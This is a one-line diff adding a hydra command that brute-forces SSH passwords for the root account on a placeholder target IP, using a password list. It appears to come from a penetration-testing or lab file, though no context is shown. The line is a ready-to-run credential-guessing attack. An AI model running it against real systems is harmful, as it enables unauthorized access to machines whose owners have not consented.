@@ -1,0 +1,1 @@
+hydra -l root -P /path/to/password_list.txt ssh://[TARGET_IP]
